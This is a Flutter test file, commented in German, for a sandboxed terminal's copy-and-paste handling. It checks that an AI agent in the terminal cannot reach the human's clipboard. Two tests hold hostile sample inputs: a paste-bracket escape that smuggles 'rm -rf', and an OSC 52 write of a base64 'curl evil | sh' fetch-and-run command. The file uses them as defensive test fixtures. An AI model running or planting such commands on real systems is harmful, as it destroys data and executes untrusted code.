// Kopieren und Einfügen im Terminal der Sandbox (HUM-313).
//
// Jeder Test prüft eine Zusage aus `backlog/sprint-5.md`, Abschnitt HUM-313:
// Die Griffe mit `Shift` gehören der Anwendung, die ohne dem Agenten; das
// Einfügen klammert, wo das Programm darum bat, und lässt kein `ESC [201~`
// durch; die Zwischenablage des Menschen bleibt für den Agenten zu. Die
// Tasten kommen als Linux-Ereignisse, und die Plattform ist Linux: Die Griffe
// hängen an ihr (`Cmd` auf Apple-Plattformen).

import 'dart:convert';

import 'package:flutter/gestures.dart';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart' hide Flow;
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:humanitl/core/shortcuts/intents.dart' show shellShortcuts;
import 'package:humanitl/core/shortcuts/shortcut_catalog.dart';
import 'package:humanitl/features/sandbox/providers/terminal_provider.dart';
import 'package:humanitl/features/sandbox/widgets/terminal_pane.dart';
import 'package:humanitl_ui/humanitl_ui.dart';
import 'package:xterm2/core.dart';
import 'package:xterm2/ui.dart';

import '../../harness/shortcut_press.dart';
import 'harness.dart';

final TargetPlatformVariant _linux = TargetPlatformVariant.only(
  TargetPlatform.linux,
);

/// Die Zwischenablage des Rechners, wie der Test sie sieht.
///
/// [text] ist ihr Inhalt, [writes] zählt jedes `Clipboard.setData`: Eine
/// Zwischenablage, in die der Agent dasselbe schreibt, was schon darin stand,
/// sähe am Inhalt allein unberührt aus.
class _Clipboard {
  String? text;
  int writes = 0;

  /// Läuft, bevor die Zwischenablage antwortet: die Lücke zwischen dem Griff
  /// und der Antwort, in der sich die Sitzung ändern kann.
  void Function()? onRead;
}

_Clipboard _mockClipboard(WidgetTester tester, {String? initial}) {
  final _Clipboard clipboard = _Clipboard()..text = initial;
  tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
    SystemChannels.platform,
    (MethodCall call) async {
      switch (call.method) {
        case 'Clipboard.setData':
          clipboard
            ..writes += 1
            ..text =
                (call.arguments as Map<Object?, Object?>)['text'] as String?;
          return null;
        case 'Clipboard.getData':
          clipboard.onRead?.call();
          final String? text = clipboard.text;
          return text == null ? null : <String, Object?>{'text': text};
        case 'Clipboard.hasStrings':
          return <String, Object?>{'value': clipboard.text != null};
      }
      return null;
    },
  );
  addTearDown(
    () => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(
      SystemChannels.platform,
      null,
    ),
  );
  return clipboard;
}

/// Der Bildschirm mit laufender Sitzung, das Terminal mit der Tastatur.
Future<SandboxTestClient> _pumpFocused(WidgetTester tester) async {
  final SandboxTestClient client = runningClient();
  await pumpSandbox(tester, client: client);
  await tester.pump();
  await tester.pump();
  expect(_session(tester, client).phase, TerminalPhase.attached);
  await tester.tap(find.byType(TerminalView));
  await tester.pump();
  client.typed.clear();
  return client;
}

TerminalSessionState _session(WidgetTester tester, SandboxTestClient client) {
  final ProviderContainer container = ProviderScope.containerOf(
    tester.element(find.byType(TerminalPane)),
  );
  return container.read(
    terminalSessionProvider(client.sandbox.sandboxId!.value),
  );
}

TerminalController _controller(WidgetTester tester) =>
    tester.widget<TerminalView>(find.byType(TerminalView)).controller!;

/// Schreibt [marker] als eigene Zeile und wählt genau sie aus.
Future<void> _selectLine(
  WidgetTester tester,
  SandboxTestClient client,
  String marker,
) async {
  final Terminal terminal = _session(tester, client).terminal;
  terminal.write('\r\n$marker\r\n');
  await tester.pump();
  final int y = terminal.buffer.absoluteCursorY - 1;
  _controller(tester).setSelection(
    terminal.buffer.createAnchor(0, y),
    terminal.buffer.createAnchor(marker.length, y),
  );
  await tester.pump();
}

/// Ein Griff mit `Ctrl`, wahlweise mit `Shift`, als Linux-Ereignisse.
Future<void> _chord(
  WidgetTester tester,
  LogicalKeyboardKey key, {
  bool shift = false,
}) async {
  await tester.sendKeyDownEvent(
    LogicalKeyboardKey.controlLeft,
    platform: 'linux',
  );
  if (shift) {
    await tester.sendKeyDownEvent(
      LogicalKeyboardKey.shiftLeft,
      platform: 'linux',
    );
  }
  await tester.sendKeyEvent(key, platform: 'linux');
  if (shift) {
    await tester.sendKeyUpEvent(
      LogicalKeyboardKey.shiftLeft,
      platform: 'linux',
    );
  }
  await tester.sendKeyUpEvent(
    LogicalKeyboardKey.controlLeft,
    platform: 'linux',
  );
  await tester.pump();
}

/// Lässt die Antwort der Zwischenablage und die Bytes zum Fake laufen.
Future<void> _settle(WidgetTester tester) async {
  for (int i = 0; i < 4; i++) {
    await tester.pump();
  }
}

List<int> _bytes(String text) => utf8.encode(text);

TerminalSession _notifier(WidgetTester tester, SandboxTestClient client) =>
    ProviderScope.containerOf(
      tester.element(find.byType(TerminalPane)),
    ).read(terminalSessionProvider(client.sandbox.sandboxId!.value).notifier);

Future<void> _middleClick(WidgetTester tester) async {
  final TestGesture gesture = await tester.startGesture(
    tester.getCenter(find.byType(TerminalView)),
    kind: PointerDeviceKind.mouse,
    buttons: kMiddleMouseButton,
  );
  await gesture.up();
  await _settle(tester);
}

HMenuItem _item(WidgetTester tester, String label) => tester
    .widget<HContextMenu>(find.byType(HContextMenu))
    .itemsBuilder()
    .firstWhere((HMenuItem item) => item.label == label);

/// Wählt eine Zeile, drückt [activator] und erwartet sie in der
/// Zwischenablage, ohne dass der Agent etwas bekommt (HUM-420).
Future<void> _copies(WidgetTester tester, ShortcutActivator activator) async {
  final _Clipboard clipboard = _mockClipboard(tester);
  final SandboxTestClient client = await _pumpFocused(tester);
  await _selectLine(tester, client, 'zq-420');
  expect(await pressActivator(tester, activator), isTrue);
  await _settle(tester);
  expect(clipboard.text, 'zq-420');
  expect(client.typed, isNot(contains(0x03)));
}

const LogicalKeyboardKey _ctrlKey = LogicalKeyboardKey.controlLeft;
const LogicalKeyboardKey _shiftKey = LogicalKeyboardKey.shiftLeft;

void main() {
  // HUM-420: Die Griffe, die `TerminalPane` selbst fragt, stehen nicht in
  // der Map der Shell. Für jeden davon wird die Taste aus dem Katalog
  // gedrückt, und das Terminal muss tun, was der Eintrag sagt; ein neuer
  // Eintrag des Terminals ohne Bindung in der Shell braucht hier eine Zeile.
  group('the terminal answers the chords of the catalogue it asks itself', () {
    final Set<ShortcutActivator> inTheShell = shellShortcuts().keys.toSet();
    final Map<
      AppShortcut,
      Future<void> Function(WidgetTester, ShortcutActivator)
    >
    cases =
        <AppShortcut, Future<void> Function(WidgetTester, ShortcutActivator)>{
          AppShortcut.terminalCopy: _copies,
          AppShortcut.terminalCopySelection: _copies,
          AppShortcut.terminalPaste:
              (WidgetTester tester, ShortcutActivator a) async {
                _mockClipboard(tester, initial: 'echo zq-420');
                final SandboxTestClient client = await _pumpFocused(tester);
                expect(await pressActivator(tester, a), isTrue);
                await _settle(tester);
                expect(client.typed, _bytes('echo zq-420'));
              },
        };

    test('every terminal entry outside the shell map has a case', () {
      expect(cases.keys.toSet(), <AppShortcut>{
        for (final AppShortcut shortcut in AppShortcut.of(
          ShortcutScope.terminal,
        ))
          if (!shortcut.activators.any(inTheShell.contains)) shortcut,
      });
    });

    for (final MapEntry<
          AppShortcut,
          Future<void> Function(WidgetTester, ShortcutActivator)
        >
        entry
        in cases.entries) {
      testWidgets('terminal_answers_catalogue_key: ${entry.key.name}', (
        WidgetTester tester,
      ) async {
        await entry.value(tester, entry.key.single);
      }, variant: _linux);
    }
  });

  testWidgets(
    'ctrl_shift_c_copies_the_selection_and_sends_nothing_to_the_agent',
    (WidgetTester tester) async {
      final _Clipboard clipboard = _mockClipboard(tester);
      final SandboxTestClient client = await _pumpFocused(tester);
      await _selectLine(tester, client, 'zq-copy-7');

      await _chord(tester, LogicalKeyboardKey.keyC, shift: true);
      await _settle(tester);

      expect(clipboard.text, 'zq-copy-7', reason: 'the selection, trimmed');
      expect(
        client.typed,
        isEmpty,
        reason: 'the chord belongs to the application, no 0x03 for the agent',
      );
    },
    variant: _linux,
  );

  // HUM-353: `Ctrl+C` über einer Auswahl kopiert, statt OpenCode zu beenden.
  testWidgets('ctrl_c_with_a_selection_copies_it_clears_it_and_sends_nothing', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    await _selectLine(tester, client, 'zq-copy-8');
    // Mit dem Tastaturprotokoll von kitty sähe der Agent auch das
    // Loslassen der Taste `C` als eigene Folge, wenn es durchfiele.
    _session(tester, client).terminal.write('\x1b[>1u');
    await tester.pump();
    client.typed.clear();

    await _chord(tester, LogicalKeyboardKey.keyC);
    await _settle(tester);

    expect(clipboard.text, 'zq-copy-8', reason: 'the selection, copied');
    expect(clipboard.writes, 1);
    final String sent = utf8.decode(client.typed, allowMalformed: true);
    expect(client.typed, isNot(contains(0x03)), reason: 'no SIGINT');
    expect(sent, isNot(contains('[99;')), reason: 'no report of the C key');
    expect(
      _controller(tester).selection,
      isNull,
      reason: 'the selection is gone, so the next Ctrl+C interrupts',
    );
  }, variant: _linux);

  testWidgets(
    'ctrl_c_after_a_copy_or_without_a_selection_interrupts_the_agent',
    (WidgetTester tester) async {
      final _Clipboard clipboard = _mockClipboard(tester);
      final SandboxTestClient client = await _pumpFocused(tester);
      expect(_controller(tester).selection, isNull);

      await _chord(tester, LogicalKeyboardKey.keyC);
      await _settle(tester);
      expect(client.typed, <int>[0x03], reason: 'Ctrl+C is SIGINT');
      expect(clipboard.writes, 0, reason: 'and nothing to copy');

      // Kopieren, dann noch einmal: Der zweite Druck ist wieder die
      // Unterbrechung.
      await _selectLine(tester, client, 'zq-copy-9');
      client.typed.clear();
      await _chord(tester, LogicalKeyboardKey.keyC);
      await _settle(tester);
      expect(client.typed, isEmpty);
      expect(clipboard.writes, 1);
      await _chord(tester, LogicalKeyboardKey.keyC);
      await _settle(tester);
      expect(client.typed, <int>[0x03]);
      expect(clipboard.writes, 1, reason: 'one copy, not two');
    },
    variant: _linux,
  );

  // Eine Auswahl überlebt Ausgabe. Ist sie aus dem Bild gerollt, kopierte
  // `Ctrl+C` still unsichtbaren Text, statt den Agenten zu unterbrechen.
  testWidgets(
    'ctrl_c_over_a_selection_scrolled_out_of_view_interrupts_and_drops_it',
    (WidgetTester tester) async {
      final _Clipboard clipboard = _mockClipboard(tester);
      final SandboxTestClient client = await _pumpFocused(tester);
      await _selectLine(tester, client, 'zq-copy-11');
      final Terminal terminal = _session(tester, client).terminal;
      terminal.write(List<String>.filled(200, 'filler').join('\r\n'));
      await tester.pump();
      expect(
        _controller(tester).selectionFor(terminal.buffer),
        isNotNull,
        reason: 'the emulator keeps the selection through output',
      );
      client.typed.clear();

      await _chord(tester, LogicalKeyboardKey.keyC);
      await _settle(tester);

      expect(client.typed, <int>[0x03], reason: 'the interrupt goes through');
      expect(clipboard.writes, 0, reason: 'nothing invisible is copied');
      expect(_controller(tester).selection, isNull, reason: 'and it is gone');
    },
    variant: _linux,
  );

  // Auf Apple-Plattformen kopiert `Cmd+C`; `Ctrl+C` bleibt dort immer die
  // Unterbrechung, wie in jedem Terminal von macOS.
  testWidgets('ctrl_c_with_a_selection_still_interrupts_on_macos', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    await _selectLine(tester, client, 'zq-copy-10');

    await tester.sendKeyDownEvent(_ctrlKey, platform: 'macos');
    await tester.sendKeyEvent(LogicalKeyboardKey.keyC, platform: 'macos');
    await tester.sendKeyUpEvent(_ctrlKey, platform: 'macos');
    await _settle(tester);

    expect(client.typed, <int>[0x03], reason: 'Ctrl+C is SIGINT on macOS');
    expect(clipboard.writes, 0, reason: 'Cmd+C copies there, not Ctrl+C');
  }, variant: TargetPlatformVariant.only(TargetPlatform.macOS));

  testWidgets('ctrl_shift_v_pastes_and_plain_ctrl_v_reaches_the_agent', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(
      tester,
      initial: 'echo zq-paste',
    );
    final SandboxTestClient client = await _pumpFocused(tester);

    await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
    await _settle(tester);
    expect(
      client.typed,
      _bytes('echo zq-paste'),
      reason: 'the clipboard went up as input, nothing else',
    );

    // `Ctrl+V` ist in readline das wörtliche Einfügen des nächsten
    // Zeichens und gehört dem Agenten, wie in jedem Terminal unter Linux.
    client.typed.clear();
    await _chord(tester, LogicalKeyboardKey.keyV);
    await _settle(tester);
    expect(client.typed, <int>[0x16], reason: 'Ctrl+V is 0x16');
    expect(clipboard.writes, 0);
  }, variant: _linux);

  testWidgets('a_held_clipboard_chord_never_falls_through_to_the_agent', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester, initial: 'once');
    final SandboxTestClient client = await _pumpFocused(tester);

    await tester.sendKeyDownEvent(
      LogicalKeyboardKey.controlLeft,
      platform: 'linux',
    );
    await tester.sendKeyDownEvent(
      LogicalKeyboardKey.shiftLeft,
      platform: 'linux',
    );
    // Jedes Ereignis der Taste gilt als behandelt. Ein Agent mit dem
    // Tastaturprotokoll von kitty bekäme sonst Wiederholungen und das
    // Loslassen eines Griffs, dessen Drücken er nie sah (wie HUM-301).
    expect(
      await tester.sendKeyDownEvent(LogicalKeyboardKey.keyV, platform: 'linux'),
      isTrue,
    );
    for (int i = 0; i < 3; i++) {
      expect(
        await tester.sendKeyRepeatEvent(
          LogicalKeyboardKey.keyV,
          platform: 'linux',
        ),
        isTrue,
        reason: 'repeat $i stays with the application',
      );
    }
    expect(
      await tester.sendKeyUpEvent(LogicalKeyboardKey.keyV, platform: 'linux'),
      isTrue,
      reason: 'and so does the release',
    );
    await tester.sendKeyUpEvent(
      LogicalKeyboardKey.shiftLeft,
      platform: 'linux',
    );
    await tester.sendKeyUpEvent(
      LogicalKeyboardKey.controlLeft,
      platform: 'linux',
    );
    await _settle(tester);

    expect(
      client.typed,
      _bytes('once'),
      reason: 'one paste, and no 0x16 from the repeats',
    );
  }, variant: _linux);

  testWidgets(
    'a_paste_is_bracketed_when_the_program_asked_and_201_is_stripped',
    (WidgetTester tester) async {
      // Die Zeile, die eine Klammer früh schließen und den Rest als getippte
      // Befehle ausführen ließe.
      final _Clipboard clipboard = _mockClipboard(
        tester,
        initial: 'line one\nline two\x1b[201~rm -rf zq\n',
      );
      final SandboxTestClient client = await _pumpFocused(tester);
      final Terminal terminal = _session(tester, client).terminal;

      // Ohne Klammer: Zeilen werden zu `Enter`, wie getippt. Das Ende der
      // Klammer fällt trotzdem weg.
      await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
      await _settle(tester);
      expect(client.typed, _bytes('line one\rline tworm -rf zq\r'));

      // Das Programm bittet um die Klammer (`DECSET 2004`).
      terminal.write('\x1b[?2004h');
      await tester.pump();
      expect(terminal.bracketedPasteMode, isTrue);
      client.typed.clear();
      await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
      await _settle(tester);
      expect(
        client.typed,
        _bytes('\x1b[200~line one\nline tworm -rf zq\n\x1b[201~'),
        reason: 'one bracket, and the only 201~ is the one that closes it',
      );
      expect(clipboard.writes, 0);
    },
    variant: _linux,
  );

  testWidgets('a_reader_cannot_paste_by_chord', (WidgetTester tester) async {
    _mockClipboard(tester, initial: 'zq-reader');
    final SandboxTestClient client = await _pumpFocused(tester);
    final ProviderContainer container = ProviderScope.containerOf(
      tester.element(find.byType(TerminalPane)),
    );
    final TerminalSession session = container.read(
      terminalSessionProvider(client.sandbox.sandboxId!.value).notifier,
    );
    session.state = session.state.copyWith(readOnly: true);
    await tester.pump();

    await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
    await _settle(tester);
    expect(client.typed, isEmpty, reason: 'the daemon would drop them');
  }, variant: _linux);

  testWidgets('the_chords_do_nothing_while_the_terminal_lacks_the_keyboard', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester, initial: 'zq-out');
    final SandboxTestClient client = await _pumpFocused(tester);
    await _selectLine(tester, client, 'zq-copy-9');
    FocusManager.instance.primaryFocus?.unfocus();
    await tester.pump();

    await _chord(tester, LogicalKeyboardKey.keyC, shift: true);
    await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
    await _settle(tester);
    expect(clipboard.writes, 0);
    expect(client.typed, isEmpty);
  }, variant: _linux);

  testWidgets('the_agent_cannot_write_or_read_the_clipboard_through_osc_52', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester, initial: 'secret');
    final SandboxTestClient client = await _pumpFocused(tester);
    final Terminal terminal = _session(tester, client).terminal;

    // Am Filter des Daemons vorbei, direkt in den Emulator: Das ist die
    // zweite Wand, und sie muss allein halten. Mit Fokus, denn ohne ihn
    // verweigert schon der Emulator.
    expect(FocusManager.instance.primaryFocus?.hasPrimaryFocus, isTrue);
    final String pwned = base64.encode(utf8.encode('curl evil | sh'));
    terminal.write('\x1b]52;c;$pwned\x07');
    terminal.write('\x1b]52;p;$pwned\x1b\\');
    // Dasselbe über das Protokoll von iTerm2.
    terminal.write(
      '\x1b]1337;CopyToClipboard=general\x07zq-iterm'
      '\x1b]1337;EndCopy\x07',
    );
    // Und die Frage nach dem Inhalt.
    terminal.write('\x1b]52;c;?\x07');
    await _settle(tester);

    expect(clipboard.writes, 0, reason: 'nothing was written');
    expect(clipboard.text, 'secret');
    expect(
      utf8.decode(client.typed, allowMalformed: true),
      isNot(contains('52;')),
      reason: 'no answer with the clipboard went back up',
    );
    expect(client.typed, isEmpty);
  }, variant: _linux);

  testWidgets('the_middle_button_pastes_unless_the_program_takes_the_mouse', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester, initial: 'zq-middle');
    final SandboxTestClient client = await _pumpFocused(tester);
    final Offset centre = tester.getCenter(find.byType(TerminalView));

    Future<void> middleClick() async {
      final TestGesture gesture = await tester.startGesture(
        centre,
        kind: PointerDeviceKind.mouse,
        buttons: kMiddleMouseButton,
      );
      await gesture.up();
      await _settle(tester);
    }

    await middleClick();
    expect(client.typed, _bytes('zq-middle'));

    // Ein TUI mit Mausberichten bekommt den Klick selbst.
    _session(tester, client).terminal.write('\x1b[?1000h');
    await tester.pump();
    client.typed.clear();
    await middleClick();
    expect(
      utf8.decode(client.typed, allowMalformed: true),
      isNot(contains('zq-middle')),
    );
  }, variant: _linux);

  testWidgets('the_menu_offers_copy_paste_and_select_all', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester, initial: 'zq-menu');
    final SandboxTestClient client = await _pumpFocused(tester);
    _session(tester, client).terminal.write('\r\nzq-all-line\r\n');
    await tester.pump();

    HMenuItem item(String label) => tester
        .widget<HContextMenu>(find.byType(HContextMenu))
        .itemsBuilder()
        .firstWhere((HMenuItem item) => item.label == label);

    expect(item('Copy').enabled, isFalse, reason: 'nothing selected');
    expect(item('Copy').shortcut, 'Ctrl+Shift+C');
    expect(item('Paste').enabled, isTrue);
    expect(item('Paste').shortcut, 'Ctrl+Shift+V');
    expect(item('Select all').enabled, isTrue);

    Future<void> openMenu() async {
      final TestGesture gesture = await tester.startGesture(
        tester.getCenter(find.byType(TerminalView)),
        kind: PointerDeviceKind.mouse,
        buttons: kSecondaryMouseButton,
      );
      await gesture.up();
      await tester.pump();
    }

    await openMenu();
    expect(find.text('Copy'), findsOneWidget);
    expect(find.text('Paste'), findsOneWidget);
    await tester.tap(find.text('Select all'));
    await tester.pump();
    expect(_controller(tester).selection, isNotNull);
    expect(item('Copy').enabled, isTrue, reason: 'now there is a selection');

    await openMenu();
    await tester.tap(find.text('Copy'));
    await _settle(tester);
    expect(clipboard.text, contains('zq-all-line'));
    expect(clipboard.text, contains(_fakeGreeting));

    client.typed.clear();
    clipboard.text = 'zq-menu';
    await openMenu();
    await tester.tap(find.text('Paste'));
    await _settle(tester);
    expect(client.typed, _bytes('zq-menu'));
  }, variant: _linux);

  testWidgets('ctrl_shift_c_without_a_selection_sends_nothing', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    expect(_controller(tester).selection, isNull);
    // Ein Agent mit dem Tastaturprotokoll von kitty (`CSI > 1 u`) bekäme
    // einen Griff, den die Anwendung nicht nimmt, als eigene Folge.
    _session(tester, client).terminal.write('\x1b[>1u');
    await tester.pump();

    await tester.sendKeyDownEvent(_ctrlKey, platform: 'linux');
    await tester.sendKeyDownEvent(_shiftKey, platform: 'linux');
    expect(
      await tester.sendKeyEvent(LogicalKeyboardKey.keyC, platform: 'linux'),
      isTrue,
      reason: 'the chord is the application\'s even with nothing to copy',
    );
    await tester.sendKeyUpEvent(_shiftKey, platform: 'linux');
    await tester.sendKeyUpEvent(_ctrlKey, platform: 'linux');
    await _settle(tester);
    // Die Modifikatoren allein meldet das Protokoll nur mit „alle Tasten als
    // Folgen“ (HUM-410); hier geht es um die Taste `C` (Codepunkt 99), die
    // nie beim Agenten ankommt, und um `0x03`, das nie gesendet wird.
    final String sent = utf8.decode(client.typed, allowMalformed: true);
    expect(sent, isNot(contains('[99;')), reason: 'no report of the C key');
    expect(client.typed, isNot(contains(0x03)));
    expect(clipboard.writes, 0);
  }, variant: _linux);

  // Codex, Review-Runde 1: Ein zweiter Druck dazwischen ließ das Loslassen
  // des ersten Griffs zum Agenten durch.
  testWidgets(
    'a_chord_key_released_after_another_press_stays_with_the_application',
    (WidgetTester tester) async {
      final _Clipboard clipboard = _mockClipboard(tester, initial: 'zq-both');
      final SandboxTestClient client = await _pumpFocused(tester);

      await tester.sendKeyDownEvent(
        LogicalKeyboardKey.controlLeft,
        platform: 'linux',
      );
      await tester.sendKeyDownEvent(
        LogicalKeyboardKey.shiftLeft,
        platform: 'linux',
      );
      expect(
        await tester.sendKeyDownEvent(
          LogicalKeyboardKey.keyV,
          platform: 'linux',
        ),
        isTrue,
      );
      expect(
        await tester.sendKeyDownEvent(
          LogicalKeyboardKey.keyC,
          platform: 'linux',
        ),
        isTrue,
      );
      expect(
        await tester.sendKeyUpEvent(LogicalKeyboardKey.keyV, platform: 'linux'),
        isTrue,
        reason: 'the release of V after the press of C',
      );
      expect(
        await tester.sendKeyUpEvent(LogicalKeyboardKey.keyC, platform: 'linux'),
        isTrue,
      );
      await tester.sendKeyUpEvent(
        LogicalKeyboardKey.shiftLeft,
        platform: 'linux',
      );
      await tester.sendKeyUpEvent(
        LogicalKeyboardKey.controlLeft,
        platform: 'linux',
      );
      await _settle(tester);

      expect(
        client.typed,
        _bytes('zq-both'),
        reason: 'the paste, nothing more',
      );
      expect(clipboard.writes, 0, reason: 'nothing selected, nothing copied');
    },
    variant: _linux,
  );

  testWidgets(
    'a_reader_or_a_session_that_is_not_attached_cannot_paste_by_menu_or_click',
    (WidgetTester tester) async {
      _mockClipboard(tester, initial: 'zq-nobody');
      final SandboxTestClient client = await _pumpFocused(tester);
      final TerminalSession session = _notifier(tester, client);

      for (final (String what, TerminalSessionState state)
          in <(String, TerminalSessionState)>[
            ('reader', session.state.copyWith(readOnly: true)),
            ('ended', session.state.copyWith(phase: TerminalPhase.ended)),
          ]) {
        session.state = state;
        await tester.pump();
        expect(_item(tester, 'Paste').enabled, isFalse, reason: what);
        await _middleClick(tester);
        expect(client.typed, isEmpty, reason: '$what: middle click');
      }
    },
    variant: _linux,
  );

  testWidgets('a_reader_by_the_time_the_clipboard_answers_does_not_paste', (
    WidgetTester tester,
  ) async {
    final _Clipboard clipboard = _mockClipboard(tester, initial: 'zq-late');
    final SandboxTestClient client = await _pumpFocused(tester);
    final TerminalSession session = _notifier(tester, client);
    // Der Griff findet einen Schreiber vor; als die Antwort kommt, liest die
    // Ansicht nur noch.
    clipboard.onRead = () =>
        session.state = session.state.copyWith(readOnly: true);

    await _chord(tester, LogicalKeyboardKey.keyV, shift: true);
    await _settle(tester);
    expect(client.typed, isEmpty);
  }, variant: _linux);

  testWidgets(
    'shift_middle_click_pastes_past_mouse_reports_unless_the_program_claims_shift',
    (WidgetTester tester) async {
      _mockClipboard(tester, initial: 'zq-shift');
      final SandboxTestClient client = await _pumpFocused(tester);
      final Terminal terminal = _session(tester, client).terminal;
      terminal.write('\x1b[?1000h');
      await tester.pump();

      await tester.sendKeyDownEvent(
        LogicalKeyboardKey.shiftLeft,
        platform: 'linux',
      );
      client.typed.clear();
      await _middleClick(tester);
      expect(client.typed, _bytes('zq-shift'), reason: 'Shift passes the TUI');

      // Das Programm beansprucht auch `Shift` (`CSI > 1 s`).
      terminal.write('\x1b[>1s');
      await tester.pump();
      expect(terminal.mouseShiftCaptureMode, isTrue);
      client.typed.clear();
      await _middleClick(tester);
      expect(
        utf8.decode(client.typed, allowMalformed: true),
        isNot(contains('zq-shift')),
      );
      await tester.sendKeyUpEvent(
        LogicalKeyboardKey.shiftLeft,
        platform: 'linux',
      );
    },
    variant: _linux,
  );

  testWidgets('copy_is_disabled_for_a_selection_of_the_other_screen', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    await _selectLine(tester, client, 'zq-main');
    expect(_item(tester, 'Copy').enabled, isTrue);

    // Ein Vollbild-TUI schaltet auf den zweiten Puffer; die Auswahl gehört
    // dem ersten.
    _session(tester, client).terminal.write('\x1b[?1049h');
    await tester.pump();
    expect(_item(tester, 'Copy').enabled, isFalse);
  }, variant: _linux);

  // Codex, Review-Runde 2: Das Leeren der Merkung beim Fokusverlust ließ das
  // Loslassen durch, wenn der Zeiger den Fokus zurückholte, bevor die Taste
  // oben war.
  testWidgets(
    'a_chord_key_released_after_the_focus_came_back_stays_with_the_application',
    (WidgetTester tester) async {
      _mockClipboard(tester, initial: 'zq-away');
      final SandboxTestClient client = await _pumpFocused(tester);
      final TestGesture mouse = await tester.createGesture(
        kind: PointerDeviceKind.mouse,
      );
      await mouse.addPointer(location: Offset.zero);
      addTearDown(mouse.removePointer);

      await tester.sendKeyDownEvent(_ctrlKey, platform: 'linux');
      await tester.sendKeyDownEvent(_shiftKey, platform: 'linux');
      expect(
        await tester.sendKeyDownEvent(
          LogicalKeyboardKey.keyV,
          platform: 'linux',
        ),
        isTrue,
      );

      // Der Fokus geht weg, und der Zeiger über dem Terminal holt ihn zurück
      // (HUM-303), während `V` noch unten ist.
      FocusManager.instance.primaryFocus?.unfocus();
      await tester.pump();
      await mouse.moveTo(tester.getCenter(find.byType(TerminalView)));
      await tester.pump();
      final FocusNode? holder = FocusManager.instance.primaryFocus;
      expect(holder?.debugLabel, 'terminal', reason: 'hover took it back');

      expect(
        await tester.sendKeyUpEvent(LogicalKeyboardKey.keyV, platform: 'linux'),
        isTrue,
        reason: 'the release of V stays with the application',
      );
      await tester.sendKeyUpEvent(_shiftKey, platform: 'linux');
      await tester.sendKeyUpEvent(_ctrlKey, platform: 'linux');
      await _settle(tester);
      expect(
        client.typed,
        _bytes('zq-away'),
        reason: 'the paste, nothing more',
      );
    },
    variant: _linux,
  );

  // HUM-410: Shift, Strg, Alt und Super allein meldet das Protokoll von kitty
  // nur, wenn das Programm alle Tasten als Folgen verlangt (Flag 8). xterm2
  // 5.2.0 schickte sie schon im Modus „eindeutig“ (`CSI > 1 u`), in dem
  // OpenCode läuft, als `CSI 57441 u`, und der Owner sah bei jedem Shift ein
  // Zeichen aus dem privaten Bereich im Eingabefeld.
  testWidgets('a_lone_modifier_sends_nothing_when_the_program_did_not_ask', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    _session(tester, client).terminal.write('\x1b[>1u');
    await tester.pump();

    for (final LogicalKeyboardKey key in <LogicalKeyboardKey>[
      LogicalKeyboardKey.shiftLeft,
      LogicalKeyboardKey.shiftRight,
      LogicalKeyboardKey.controlLeft,
      LogicalKeyboardKey.controlRight,
      LogicalKeyboardKey.altLeft,
      LogicalKeyboardKey.altRight,
      LogicalKeyboardKey.metaLeft,
      LogicalKeyboardKey.metaRight,
    ]) {
      await tester.sendKeyDownEvent(key, platform: 'linux');
      await tester.sendKeyUpEvent(key, platform: 'linux');
    }
    await _settle(tester);
    expect(client.typed, isEmpty, reason: 'no report of a lone modifier');

    // Mit Shift getippt kommt der Buchstabe weiter an, nur die Taste allein
    // bleibt stumm.
    await tester.sendKeyDownEvent(_shiftKey, platform: 'linux');
    await tester.sendKeyEvent(
      LogicalKeyboardKey.keyA,
      platform: 'linux',
      character: 'A',
    );
    await tester.sendKeyUpEvent(_shiftKey, platform: 'linux');
    await _settle(tester);
    expect(client.typed, _bytes('A'));
  }, variant: _linux);

  testWidgets('a_program_that_asks_for_every_key_still_hears_the_modifier', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    _session(tester, client).terminal.write('\x1b[>9u');
    await tester.pump();

    await tester.sendKeyDownEvent(_shiftKey, platform: 'linux');
    await tester.sendKeyUpEvent(_shiftKey, platform: 'linux');
    await _settle(tester);
    expect(
      utf8.decode(client.typed, allowMalformed: true),
      contains('[57441'),
      reason: 'flag 8 asks for every key, Shift included',
    );
  }, variant: _linux);

  // Codex, Review HUM-410: xterm2 5.4.0 überlässt das Ziehen einem Programm
  // mit Mausberichten, und ohne Markierung gibt es nichts zu kopieren.
  testWidgets('dragging_selects_even_while_the_program_reports_the_mouse', (
    WidgetTester tester,
  ) async {
    _mockClipboard(tester);
    final SandboxTestClient client = await _pumpFocused(tester);
    final Terminal terminal = _session(tester, client).terminal;
    terminal.write('\r\nzq-drag-me-please\r\n\x1b[?1000h');
    await tester.pump();
    expect(_controller(tester).selection, isNull);

    final Rect view = tester.getRect(find.byType(TerminalView));
    final TestGesture gesture = await tester.startGesture(
      view.topLeft + const Offset(12, 12),
      kind: PointerDeviceKind.mouse,
    );
    await tester.pump();
    await gesture.moveTo(view.topLeft + const Offset(160, 40));
    await tester.pump();
